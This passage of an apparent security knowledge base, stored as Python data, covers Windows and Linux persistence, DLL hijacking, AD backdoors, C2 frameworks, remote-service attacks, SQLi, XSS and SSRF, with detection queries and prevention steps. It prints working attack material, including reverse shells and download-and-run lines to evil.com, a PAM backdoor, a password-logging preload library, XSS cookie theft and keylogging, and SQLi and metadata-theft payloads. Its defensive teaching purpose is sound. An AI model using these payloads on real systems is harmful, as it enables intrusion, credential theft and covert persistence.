    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 325"
}

# Consumer: execute payload
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments @{
    Name = "SystemStartConsumer"
    CommandLineTemplate = "powershell.exe -w hidden -enc BASE64PAYLOAD"
}

# Binding
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{
    Filter = $Filter; Consumer = $Consumer
}
```

## Detection Opportunities

```kql
// Registry run key write (Sysmon Event 13)
event.code: "13" AND
registry.path: ("*CurrentVersion\\Run*" OR "*Winlogon*") AND
NOT process.name: ("msiexec.exe" OR "setup.exe")

// New service (Event 7045)
winlog.event_id: 7045 AND
NOT winlog.event_data.ServiceFileName: ("C:\\Windows\\*" OR "C:\\Program Files\\*")

// Scheduled task created (Event 4698)
winlog.event_id: 4698 AND
NOT winlog.event_data.TaskName: ("\\Microsoft\\Windows\\*")

// WMI subscription (Event 5861)
winlog.event_id: 5861
```

## Prevention

1. **Autoruns (Sysinternals)**: Regular review of all autostart locations
2. **FIM**: Alert on new files in %TEMP%, %APPDATA%
3. **EDR**: Modern EDRs detect all persistence mechanisms above
4. **AppLocker/WDAC**: Prevent execution from user-writable paths
5. **Service hardening**: Require signed service binaries
6. **WMI monitoring**: Alert on new permanent WMI subscriptions
""",
    },
    {
        "title": "DLL Hijacking and Search Order Abuse",
        "tags": ["dll-hijacking", "search-order", "T1574.001", "T1574.002", "persistence", "privesc"],
        "content": r"""# DLL Hijacking and Search Order Abuse

## Overview

DLL hijacking exploits the Windows DLL search order to execute a malicious DLL instead of a legitimate one. It achieves both privilege escalation and persistence.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1574.001 | DLL Search Order Hijacking | Defence Evasion / Persistence |
| T1574.002 | DLL Side-Loading | Defence Evasion / Persistence |

## Windows DLL Search Order

```
1. Directory containing the calling EXE
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Current working directory
6. Directories in %PATH%
```

If the EXE's directory is user-writable and the DLL doesn't exist in System32, an attacker can plant a malicious DLL there.

## Finding Opportunities

```powershell
# Process Monitor â€” filter for "NAME NOT FOUND" on DLL loads
# PowerUp
Find-ProcessDLLHijack
Find-PathDLLHijack

# Check %PATH% for writable directories
$env:PATH.Split(";") | ForEach-Object {
    $acl = Get-Acl $_ -ErrorAction SilentlyContinue
    if ($acl) {
        $acl.Access | Where-Object {
            $_.FileSystemRights -like "*Write*" -and $_.IdentityReference -like "*Users*"
        }
    }
}
```

## Malicious DLL Template

```c
// malicious_helper.dll â€” C DllMain payload
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        WinExec("powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/rev.ps1')", SW_HIDE);
        // Forward to real DLL to avoid crashes:
        LoadLibraryA("C:\\Windows\\System32\\real_helper.dll");
    }
    return TRUE;
}
```

```bash
# Cross-compile
x86_64-w64-mingw32-gcc -shared -o helper.dll malicious.c -lws2_32
```

## DLL Side-Loading

Places a malicious DLL alongside a legitimate signed EXE that loads it â€” execution appears as the legitimate process.

```
Example: Place malicious version.dll next to signed legitimate.exe
         legitimate.exe loads version.dll from its own directory
         Process looks legitimate in task manager / EDR
```

## Detection Opportunities

```kql
// Sysmon Event 7 â€” DLL loaded from unexpected path
event.code: "7" AND
dll.path: NOT ("C:\\Windows\\*" OR "C:\\Program Files\\*") AND
process.code_signature.trusted: true

// New DLL in application directory (Sysmon Event 11)
event.code: "11" AND
file.extension: "dll" AND
file.path: NOT ("C:\\Windows\\*" OR "C:\\Program Files\\*") AND
NOT process.name: ("msiexec.exe" OR "setup.exe")
```

## Prevention

1. **SafeDllSearchMode**: `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode = 1`
2. **CWD control**: Privileged processes should not run from user-writable directories
3. **Application directory permissions**: Remove user write access from Program Files subdirs
4. **WDAC**: Require DLL signing â€” malicious unsigned DLLs blocked
5. **Developers**: Always use full paths in `LoadLibrary` calls
6. **Process Monitor auditing**: Regular checks for NAME NOT FOUND DLL loads
""",
    },
    {
        "title": "Active Directory Persistence â€” AdminSDHolder, GPO Abuse, SID History",
        "tags": ["AD-persistence", "AdminSDHolder", "GPO-abuse", "SID-history", "T1484", "T1134.005"],
        "content": r"""# Active Directory Persistence â€” AdminSDHolder, GPO Abuse, SID History

## Overview

AD persistence techniques maintain privileged access even after password resets. They abuse legitimate AD features, making detection and remediation require specific expertise.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1484.001 | Domain Policy Modification: GPO Modification | Defence Evasion / Persistence |
| T1134.005 | SID-History Injection | Privilege Escalation |

## AdminSDHolder Abuse

`AdminSDHolder` ACL is copied to all protected privileged group members every 60 minutes by `SDProp`. By modifying AdminSDHolder's ACL, attackers ensure persistence survives attempts to remove their permissions.

```powershell
# Add backdoor account with GenericAll on AdminSDHolder (PowerView)
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=targetcorp,DC=com' -PrincipalIdentity backdoor_user -Rights All

# After 60 minutes, SDProp runs â†’ backdoor_user has GenericAll on Domain Admins, EA, etc.
# backdoor_user can add themselves to Domain Admins at any time
```

## GPO Abuse

```powershell
# Find GPOs writable by current user
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "Write" -and
    $_.SecurityIdentifier -match (Get-DomainUser lowpriv).objectsid
}

# SharpGPOAbuse â€” add scheduled task to GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "WindowsUpdate" \
  --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" \
  --Arguments "/c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add" \
  --GPOName "Default Domain Policy"
```

## SID History Injection

```powershell
# Inject Enterprise Admin SID into user's SID History
# Requires DA on source domain
privilege::debug
sid::patch
sid::add /sam:backdoor_user /new:S-1-5-21-ROOTDOMAIN-SID-519

# User now has effective Enterprise Admin rights via SID History
# Not a member of any privileged group â€” harder to detect
```

## Object ACL Backdoors

```powershell
# Grant DCSync rights without adding to privileged groups
Add-DomainObjectAcl -TargetIdentity "DC=targetcorp,DC=com" -PrincipalIdentity backdoor_user -Rights DCSync

# Grant GenericAll on specific DA account
Add-DomainObjectAcl -TargetIdentity "CN=Administrator,CN=Users,DC=targetcorp,DC=com" -PrincipalIdentity backdoor_user -Rights All
# Now backdoor_user can reset DA password at any time
```

## Detection Opportunities

```kql
// AdminSDHolder ACL modification (Event 4662)
winlog.event_id: 4662 AND
winlog.event_data.ObjectDN: "*AdminSDHolder*" AND
winlog.event_data.OperationType: ("WRITE_DAC" OR "WRITE_PROPERTY")

// GPO modification (Event 5136)
winlog.event_id: 5136 AND
winlog.event_data.ObjectClass: "groupPolicyContainer"

// SID History added (Event 4765) â€” almost never legitimate in production
winlog.event_id: 4765
```

### BloodHound
Regular ingestion reveals new attack paths to DA that didn't exist before â€” indicating ACL changes.

## Prevention

1. **Monitor AdminSDHolder ACL**: Alert on any modification
2. **Regular ACL audit**: Review rights on domain NC head monthly
3. **GPO permissions audit**: Review write access quarterly
4. **Disable SID History**: Unless actively migrating between domains
5. **Tier 0 monitoring**: Any change to DC/AdminSDHolder should alert immediately
6. **BloodHound Enterprise**: Continuous ACL change tracking
""",
    },
    {
        "title": "Cobalt Strike and C2 Framework Overview (Educational)",
        "tags": ["cobalt-strike", "c2", "command-and-control", "T1071", "T1095", "beacon", "post-exploitation"],
        "content": r"""# Cobalt Strike and C2 Framework Overview (Educational)

## Overview

Understanding C2 frameworks â€” particularly Cobalt Strike, the most widely abused by ransomware and APT groups â€” is essential for SOC analysts to detect and respond to intrusions. This article covers how they work from a defensive perspective.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1071.001 | Web Protocols | C2 |
| T1071.004 | DNS | C2 |
| T1573 | Encrypted Channel | C2 |
| T1090 | Proxy | C2 |
| T1055 | Process Injection | Defence Evasion |

## Cobalt Strike Architecture

```
Team Server (attacker VPS)
    â”‚
    â”‚  HTTPS/DNS/SMB (malleable C2 channel)
    â–¼
Beacon (implant on victim host)
    â”‚
    â”œâ”€â”€ Configurable sleep: 60s Â± 20% jitter
    â”œâ”€â”€ Capabilities:
    â”‚     execute-assembly  â€” run .NET binary in memory
    â”‚     powerpick         â€” PowerShell without powershell.exe
    â”‚     psinject          â€” inject PS into arbitrary process
    â”‚     jump psexec/wmi   â€” lateral movement
    â”‚     hashdump          â€” dump local hashes
    â”‚     logonpasswords    â€” Mimikatz credential dump
    â”‚     socks4a           â€” SOCKS proxy for tunnelling
    â”‚     upload/download   â€” file transfer
    â””â”€â”€ Named pipe for SMB Beacon (internal C2 chain)
```

## Malleable C2 Profiles

Transform Cobalt Strike traffic to mimic legitimate applications:

```
# Amazon profile example â€” checkins look like Amazon shopping traffic
http-get {
    set uri "/s/ref=nb_sb_noss_1/field-keywords=books";
    client {
        header "Host" "www.amazon.com";
        metadata {
            base64url;
            prepend "session-token=";
            header "Cookie";
        }
    }
}

# Resulting request:
GET /s/ref=nb_sb_noss_1/field-keywords=books HTTP/1.1
Host: www.amazon.com
Cookie: session-token=AAAAAA...  (base64 beacon data)
```

## DNS C2

```
# Beacon data encoded in subdomain queries:
dig AAAAAAAAAA.c2.attacker.com A
# AAAAAAAAAA = base64-encoded C2 data

# Detection: high-volume queries to same SLD with high-entropy subdomains
# Threshold: >50 subdomains per hour to same parent domain
```

## Cobalt Strike Detection Fingerprints

### JA3/JA3S TLS Fingerprinting
```
# Default Cobalt Strike TLS hello has known JA3 hashes:
# 72a589da586844d7f0818ce684948eea
# Feed into Zeek/Suricata for alerting
```

### YARA Memory Scan
```yara
rule CobaltStrike_Beacon {
    strings:
        $s1 = "%s (admin)" fullword ascii
        $s2 = "beacon.dll" ascii nocase
        $pipe = "\\\\.\\pipe\\MSSE-" ascii
    condition:
        2 of them
}
```

### Process Behaviour
```kql
// Unusual process making outbound connection (injection indicator)
event.code: "3" AND
process.name: ("svchost.exe" OR "rundll32.exe" OR "dllhost.exe") AND
NOT destination.ip: (internal_ranges) AND
NOT process.parent.name: ("services.exe" OR "lsass.exe")
```

## Other Common C2 Frameworks

| Framework | Language | Key Feature | Threat Actor Use |
|---|---|---|---|
| Metasploit Meterpreter | Ruby/C | Widely known | Commodity attackers |
| Sliver | Go | Open source CS alt | Growing usage |
| Havoc | C/C++ | EDR evasion focus | APT groups |
| Brute Ratel | C | Designed for EDR evasion | APT29, ransomware |
| Mythic | Python | Modular, many agent types | Red teams |

## Detection Strategy for SOC

1. **JA3/JA3S**: Known C2 TLS fingerprints in Zeek/Suricata
2. **DNS beaconing**: Query frequency analysis to same SLD
3. **Process injection**: Unusual parent-child + network connections
4. **Memory scanning**: YARA rules for Beacon artifacts in EDR
5. **Threat intelligence**: Team server IPs/domains in SIEM blocklists
6. **Malleable profile hunting**: HTTP request pattern matching
""",
    },
    {
        "title": "Linux Persistence â€” Cron Jobs, SSH Keys, LD_PRELOAD, PAM Backdoors",
        "tags": ["linux-persistence", "cron", "ssh-keys", "LD_PRELOAD", "PAM", "T1053.003", "T1098.004"],
        "content": r"""# Linux Persistence â€” Cron Jobs, SSH Keys, LD_PRELOAD, PAM Backdoors

## Overview

Linux persistence plants hooks that survive reboots. Each technique targets a different OS layer â€” requiring layered detection to catch them all.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1053.003 | Scheduled Task/Job: Cron | Persistence |
| T1098.004 | Account Manipulation: SSH Authorized Keys | Persistence |
| T1574.006 | Dynamic Linker Hijacking | Persistence |
| T1556.003 | Modify Authentication Process: PAM | Persistence |

## Cron Jobs

```bash
# User crontab
crontab -e
# Add: */5 * * * * bash -i >& /dev/tcp/evil.com/4444 0>&1

# System-wide (root required)
echo "*/5 * * * * root /tmp/.cache" >> /etc/crontab

# @reboot persistence
(crontab -l; echo "@reboot /tmp/.hidden_beacon &") | crontab -

# Disguise: filename mimicking legitimate cron
cat > /etc/cron.d/apt-daily << 'EOF'
* * * * * root curl -s http://evil.com/beacon.sh | bash 2>/dev/null
EOF
```

## SSH Authorized Keys

```bash
# Add attacker public key â€” survives password changes
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAA...attacker_key... evil" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root
echo "ssh-rsa AAAA...key..." >> /root/.ssh/authorized_keys

# Connect:
ssh -i attacker_privkey user@target
```

## LD_PRELOAD Persistence

```c
// Intercept getpass() to capture sudo passwords
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
char *getpass(const char *prompt) {
    char *(*real)(const char*) = dlsym(RTLD_NEXT, "getpass");
    char *pass = real(prompt);
    FILE *f = fopen("/tmp/.log", "a");
    fprintf(f, "%s\n", pass);
    fclose(f);
    return pass;
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /lib/libutil.so.1 preload.c -ldl

# System-wide (root): overrides all processes
echo "/lib/libutil.so.1" >> /etc/ld.so.preload

# Per-user: add to .bashrc
echo "export LD_PRELOAD=/home/user/.lib/libx.so" >> ~/.bashrc
```

## PAM Backdoor (Most Stealthy)

```c
// pam_backdoor.c â€” hardcoded password accepted for any account
#include <security/pam_modules.h>
#include <string.h>
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (password && strcmp(password, "B@ckd00r2025!") == 0)
        return PAM_SUCCESS;
    return PAM_AUTH_ERR;
}
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
```

```bash
# Compile and install
gcc -fPIC -shared -o /lib/x86_64-linux-gnu/security/pam_env2.so pam_backdoor.c -lpam

# Insert into common-auth BEFORE existing lines
sed -i '1s/^/auth sufficient pam_env2.so\n/' /etc/pam.d/common-auth

# Now: any user + password "B@ckd00r2025!" â†’ authenticated
```

## Detection Opportunities

```bash
# File integrity monitoring
aide --check  # Detects changes to /etc/crontab, /etc/pam.d/*, /etc/ld.so.preload

# Audit rules
auditctl -w /etc/crontab -p wa -k cron_mod
auditctl -w /root/.ssh/authorized_keys -p wa -k ssh_keys
auditctl -w /etc/ld.so.preload -p wa -k preload_mod

# Check LD_PRELOAD manually
cat /etc/ld.so.preload  # should be empty
find /lib/*/security/ -newer /var/lib/dpkg/info/libpam-modules.list  # new PAM modules
```

```kql
// Cron file modification (auditd â†’ SIEM)
audit.type: "SYSCALL" AND audit.file.path: "/etc/crontab"

// New PAM module
audit.type: "CREATE" AND audit.file.path: "/lib/*/security/*.so"

// SSH key write
audit.syscall: "write" AND audit.file.path: "*/authorized_keys"
```

## Prevention

1. **FIM (AIDE/Tripwire)**: Baseline /etc/crontab, /etc/pam.d/, /etc/ld.so.preload
2. **Immutable files**: `chattr +i /etc/crontab /etc/pam.d/sshd`
3. **SSH key policy**: Periodic review and rotation; alert on new authorized_keys additions
4. **Restrict LD_PRELOAD**: SELinux/AppArmor policies
5. **PAM integrity**: Verify with `dpkg --verify libpam*`; alert on new .so in security dir
6. **auditd**: Comprehensive syscall auditing for sensitive file writes
""",
    },
    {
        "title": "Remote Service Exploitation â€” RDP, SSH, VNC Attacks",
        "tags": ["rdp", "ssh", "vnc", "brute-force", "T1110", "T1021.001", "BlueKeep"],
        "content": r"""# Remote Service Exploitation â€” RDP, SSH, VNC Attacks

## Overview

Remote access services exposed to the internet are prime targets. Attackers exploit weak credentials, protocol vulnerabilities, and misconfigurations for direct interactive access.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1021.001 | Remote Services: RDP | Lateral Movement |
| T1021.004 | Remote Services: SSH | Lateral Movement |
| T1021.005 | Remote Services: VNC | Lateral Movement |
| T1110.001 | Brute Force: Password Guessing | Credential Access |
| T1190 | Exploit Public-Facing Application | Initial Access |

## RDP Attacks

```bash
# Hydra brute force
hydra -l administrator -P rockyou.txt rdp://10.10.10.50 -t 4 -W 3

# CrackMapExec spray
crackmapexec rdp 10.10.10.0/24 -u users.txt -p passwords.txt
```

### BlueKeep (CVE-2019-0708) â€” Pre-auth RCE

```bash
# Metasploit (Windows 7 / Server 2008 R2 only)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.10.50
set TARGET 2
run
# Warning: can cause BSOD â€” use only on authorised systems
```

### RDP Session Hijacking (No Password)

```cmd
# Requires SYSTEM on target â€” hijack disconnected session
query session /server:target
tscon 2 /dest:rdp-tcp#0  # Hijack session ID 2, no password needed
```

## SSH Attacks

```bash
# Brute force
hydra -l root -P passwords.txt ssh://10.10.10.50 -t 10

# Username enumeration (CVE-2018-15473, OpenSSH < 7.7)
python ssh_enum.py --username-file users.txt --target 10.10.10.50

# SSH agent forwarding abuse (lateral movement without credentials)
# If victim has forwarded agent to a compromised host:
SSH_AUTH_SOCK=/tmp/ssh-xyz/agent.pid ssh user@internal_host

# Tunnelling / pivoting
ssh -D 1080 user@bastion -N  # SOCKS proxy through SSH
proxychains nmap -sT 10.10.10.0/24
```

## VNC Attacks

```bash
# Scan for VNC services
nmap -sV -p 5900-5910 10.10.10.0/24

# Brute force
hydra -P passwords.txt vnc://10.10.10.50

# Metasploit VNC auth scanner
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 10.10.10.0/24
run

# VNC without password (common misconfiguration)
vncviewer 10.10.10.50::5900
```

## Detection Opportunities

### RDP (Windows Event Logs)
```kql
// Brute force
SecurityEvent
| where EventID == 4625 AND LogonType == 10
| summarize count() by IpAddress, bin(TimeGenerated, 5m)
| where count_ > 10

// External RDP success (LogonType 10 from non-internal IP)
SecurityEvent
| where EventID == 4624 AND LogonType == 10
| where not(IpAddress matches regex @"^10\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[01])\.")
```

### SSH (/var/log/auth.log)
```bash
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head
grep "Accepted" /var/log/auth.log | grep -v "192.168."  # external logins
```

## Prevention

1. **Never expose RDP/SSH/VNC directly**: Require VPN + jump host
2. **Patch immediately**: BlueKeep variants are exploited within hours of disclosure
3. **NLA for RDP**: Requires credentials before session establishment
4. **SSH hardening**: `PermitRootLogin no`, `PasswordAuthentication no`, `AllowUsers` whitelist
5. **Fail2ban**: Auto-block IPs after >5 failed auth attempts
6. **VNC**: Always tunnel through SSH or VPN; require strong VNC password
7. **MFA**: Duo/Okta for SSH and RDP authentication
""",
    },
]


# ============================================================
# COLLECTION 4: WEB APPLICATION ATTACKS
# ============================================================

WEB_ATTACKS = [
    {
        "title": "SQL Injection — Union, Blind, Time-Based, Second-Order",
        "tags": ["sql-injection", "SQLi", "T1190", "web-app", "database", "sqlmap"],
        "content": r"""# SQL Injection — Union, Blind, Time-Based, Second-Order

## Overview

SQL injection (SQLi) remains one of the most prevalent web vulnerabilities. It lets attackers manipulate database queries to extract data, bypass authentication, and execute OS commands. Understanding all SQLi variants is critical for SOC analysts reviewing WAF alerts.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1213 | Data from Information Repositories | Collection |

## 1. Classic / UNION-Based

```sql
-- Fingerprint injectable parameter
https://site.com/product?id=1'             -- syntax error reveals DB type
https://site.com/product?id=1 AND 1=1     -- True: normal page
https://site.com/product?id=1 AND 1=2     -- False: different/empty page

-- Determine column count
?id=1 ORDER BY 1-- -
?id=1 ORDER BY 3-- -  (error = only 2 columns)

-- Extract data via UNION
?id=-1 UNION SELECT NULL,NULL-- -
?id=-1 UNION SELECT database(),user()-- -
?id=-1 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
?id=-1 UNION SELECT username,password FROM users-- -
```

## 2. Blind Boolean-Based

```sql
-- Page behaves differently for TRUE vs FALSE conditions
?id=1 AND SUBSTRING(database(),1,1)='t'-- -
?id=1 AND ASCII(SUBSTRING(database(),1,1))>116-- -  (binary search)

-- sqlmap boolean blind
sqlmap -u "https://site.com/product?id=1" --technique=B --dbms=mysql --dbs
```

## 3. Time-Based Blind

```sql
-- Infer true/false from response delay
-- MySQL: SLEEP()
?id=1 AND IF(1=1, SLEEP(5), 0)-- -
?id=1 AND IF(SUBSTRING(database(),1,1)='t', SLEEP(5), 0)-- -

-- MSSQL: WAITFOR DELAY
?id=1; IF (1=1) WAITFOR DELAY '0:0:5'-- -

-- sqlmap time-based
sqlmap -u "https://site.com/?id=1" --technique=T --dbms=mssql --dump -T users
```

## 4. Second-Order (Stored) SQLi

```sql
-- Payload stored safely, executed later in a different context
-- Step 1: Register username: admin'-- -
-- (safely inserted with parameterised query)

-- Step 2: App uses stored username in a vulnerable later query:
SELECT * FROM users WHERE username='admin'-- -' AND active=1
-- Comment removes AND clause: returns admin regardless of active status

-- Detection: use time-delay payloads in stored fields
-- Username: '; WAITFOR DELAY '0:0:5'-- -
-- -> stored; delay fires when username is later used in dynamic SQL
```

## 5. Out-of-Band / DNS Exfiltration

```sql
-- MySQL: UNC path triggers DNS lookup
?id=1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.evil.com\\\\x'))-- -

-- MSSQL: xp_dirtree DNS exfiltration
?id=1; EXEC master..xp_dirtree '\\\\'+@@version+'.evil.com\\x'-- -
```

## SQLMap Cheatsheet

```bash
# Basic scan
sqlmap -u "https://site.com/?id=1" --batch

# Authenticated endpoint
sqlmap -u "https://site.com/api?id=1" --cookie="session=abc"

# POST parameter
sqlmap -u "https://site.com/login" --data="user=a&pass=b" -p user

# Dump specific table
sqlmap -u "https://site.com/?id=1" --dbms=mysql -D app -T users --dump

# OS shell (if DB user has file privileges)
sqlmap -u "https://site.com/?id=1" --os-shell

# WAF bypass tamper scripts
sqlmap -u "https://site.com/?id=1" --tamper=space2comment,between,randomcase
```

## Detection Opportunities

```kql
// SQL keywords in URL parameters
http.request.uri: ("UNION" OR "SELECT" OR "SLEEP" OR "WAITFOR" OR "INFORMATION_SCHEMA")

// sqlmap User-Agent
http.request.headers.user_agent: "sqlmap*"

// HTTP 500 errors with DB error patterns in response
http.response.status_code: 500 AND
http.response.body: ("SQL syntax" OR "ORA-" OR "Unclosed quotation mark")

// Time-based: requests to same endpoint with response time > 5 seconds
```

## Prevention

1. **Parameterised queries / prepared statements**: Absolute prevention for all SQLi types
2. **ORM usage**: SQLAlchemy, Hibernate, Django ORM; avoid raw query concatenation
3. **Input validation**: Whitelist allowed characters; reject SQL metacharacters
4. **WAF**: OWASP Core Rule Set blocks common SQLi patterns
5. **Least privilege DB account**: SELECT only on app tables; no xp_cmdshell; no DROP
6. **Error handling**: Never expose DB error messages to users
""",
    },
    {
        "title": "Cross-Site Scripting (XSS) — Reflected, Stored, DOM-Based",
        "tags": ["XSS", "cross-site-scripting", "T1059.007", "web-app", "javascript", "session-hijacking"],
        "content": r"""# Cross-Site Scripting (XSS) — Reflected, Stored, DOM-Based

## Overview

XSS injects malicious JavaScript into web pages viewed by other users, enabling session hijacking, credential theft, keylogging, and phishing redirection.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1059.007 | JavaScript | Execution |
| T1185 | Browser Session Hijacking | Collection |
| T1539 | Steal Web Session Cookie | Credential Access |

## Type 1 — Reflected XSS

Payload in request is immediately reflected in response. Requires tricking user into clicking malicious link.

```html
<!-- Basic test -->
https://site.com/search?q=<script>alert(1)</script>

<!-- Session cookie theft -->
https://site.com/search?q=<script>document.location='https://evil.com/c?'+document.cookie</script>

<!-- Filter bypass variants -->
https://site.com/search?q=<img src=x onerror=alert(1)>
https://site.com/search?q=<svg onload=alert(1)>
https://site.com/search?q=<details open ontoggle=alert(1)>
```

## Type 2 — Stored (Persistent) XSS

Payload stored in DB; executes for every user who views that content.

```html
<!-- Keylogger in bio/comment field -->
<script>
    document.onkeypress = function(e) {
        new Image().src = 'https://evil.com/k?k=' + encodeURIComponent(e.key);
    };
</script>

<!-- BeEF hook for interactive browser control -->
<script src="http://evil.com:3000/hook.js"></script>

<!-- CSRF token theft via XSS (bypasses SameSite=Lax) -->
<script>
fetch('/settings').then(r=>r.text()).then(html=>{
    var t = html.match(/csrf_token" value="([^"]+)"/)[1];
    fetch('https://evil.com/csrf?t='+t);
});
</script>
```

## Type 3 — DOM-Based XSS

Vulnerability in client-side JavaScript that writes user-controlled data to DOM without sanitisation.

```javascript
// Vulnerable code:
document.getElementById("welcome").innerHTML = "Hello " + location.hash.substring(1);
// URL: https://site.com/page#<img src=x onerror=alert(1)>

// document.write with URL param
var lang = document.URL.split("lang=")[1];
document.write("<option>" + lang + "</option>");
// URL: https://site.com/page?lang=</option><script>alert(1)</script>

// eval() with user input (extremely dangerous)
eval("var x = '" + urlParam + "'");
// Input: '; alert(1); var y = '
```

## Detection Opportunities

```kql
// XSS payload patterns in request
http.request.uri: ("<script" OR "onerror=" OR "javascript:" OR "onload=")

// CSP violation reports (if report-uri configured)
// Any script-src violation = potential XSS execution attempt

// Stored XSS beacon: web server making unusual outbound requests
// (some frameworks log fetch() calls server-side)
```

## Prevention

1. **Output encoding**: `htmlspecialchars()` / `escapeHtml()` on all user data in HTML context
2. **Content Security Policy**: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'`
3. **HttpOnly cookies**: `Set-Cookie: session=...; HttpOnly` prevents JS cookie access
4. **SameSite cookies**: Reduces CSRF + XSS chaining
5. **DOM sanitisation**: Use `textContent` not `innerHTML`; DOMPurify for rich text
6. **CSP reporting**: `report-uri /csp-report` to SIEM for XSS detection
""",
    },
    {
        "title": "Server-Side Request Forgery (SSRF) — Cloud Metadata, Internal Services",
        "tags": ["SSRF", "cloud-metadata", "T1552.005", "AWS", "IMDS", "internal-recon"],
        "content": r"""# Server-Side Request Forgery (SSRF) — Cloud Metadata, Internal Services

## Overview

SSRF tricks a server into making HTTP requests to attacker-specified targets including cloud metadata endpoints, internal services, and localhost. In cloud environments, SSRF often leads directly to credential theft and full account compromise.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1552.005 | Unsecured Credentials: Cloud Instance Metadata API | Credential Access |
| T1090 | Proxy | C2 |

## Cloud Metadata SSRF

### AWS IMDS v1 (unauthenticated)

```bash
# Direct access via SSRF:
POST /api/fetch
{"url": "http://169.254.169.254/latest/meta-data/"}
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-PROD-ROLE"}
# Returns: AccessKeyId, SecretAccessKey, Token
# -> Full AWS API access with role permissions
```

### AWS IMDSv2 Bypass

```bash
# IMDSv2 requires a PUT to get a token first -- mitigates simple GET SSRF
# But: if app follows redirects, a 307 redirect carries the PUT method:
# Attacker server: HTTP/1.1 307 Temporary Redirect
#                  Location: http://169.254.169.254/latest/api/token
# App sends PUT to metadata service -> gets token -> attacker exfiltrates it
```

### Azure IMDS

```bash
{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
# Requires Metadata: true header -- include in SSRF request if possible
{"url": "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/"}
# Returns managed identity OAuth token
```

### GCP IMDS

```bash
{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}
# Requires Metadata-Flavor: Google header
```

## Internal Network Discovery

```python
# Port scan internal network via SSRF
import requests

for octet in range(1, 255):
    for port in [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]:
        r = requests.post("https://site.com/api/fetch",
                          json={"url": f"http://192.168.1.{octet}:{port}/"},
                          timeout=2)
        if r.status_code != 500:
            print(f"OPEN: 192.168.1.{octet}:{port}")

# High-value internal targets:
# http://localhost:6379/    -> Redis (often no auth)
# http://localhost:9200/    -> Elasticsearch (often no auth)
# http://localhost:2375/    -> Docker API (RCE if exposed)
# http://localhost:8500/    -> Consul API
```

## SSRF Filter Bypass Techniques

```
# IP representations for 127.0.0.1:
http://0x7f000001/         (hex)
http://2130706433/         (decimal)
http://[::1]/              (IPv6 localhost)
http://0177.0.0.1/         (octal)
http://127.1/              (short form)

# DNS rebinding: domain resolves to public IP for validation,
# then resolves to 169.254.169.254 for actual request
# Tools: rebind.network, rbndr.us

# Open redirect on allowlisted domain:
{"url": "https://trusted.com/redirect?to=http://169.254.169.254/"}
```

## Detection Opportunities

```kql
// Web app making requests to metadata IPs
http.request.url: ("169.254.169.254" OR "metadata.google.internal") AND
NOT source.ip: ("user_browser_ips")

// AWS CloudTrail: role credentials used from non-EC2 source
AWSCloudTrail
| where sourceIPAddress !contains "amazonaws.com"
| where userIdentity.type == "AssumedRole"
| where userIdentity.sessionContext.sessionIssuer.userName contains "EC2"

// Internal service access from web tier (anomalous lateral)
network.destination.ip: ("10.0.0.0/8" OR "172.16.0.0/12" OR "192.168.0.0/16") AND
source.service: "webapp"
```

## Prevention

1. **Enforce IMDSv2** on all EC2 instances: `aws ec2 modify-instance-metadata-options --http-tokens required`
2. **SSRF validation in code**: Allowlist URL schemes and domains; block internal IP ranges
3. **Network egress control**: Web servers cannot reach 169.254.0.0/16 or internal services
4. **WAF**: Block requests containing metadata IP patterns in POST body
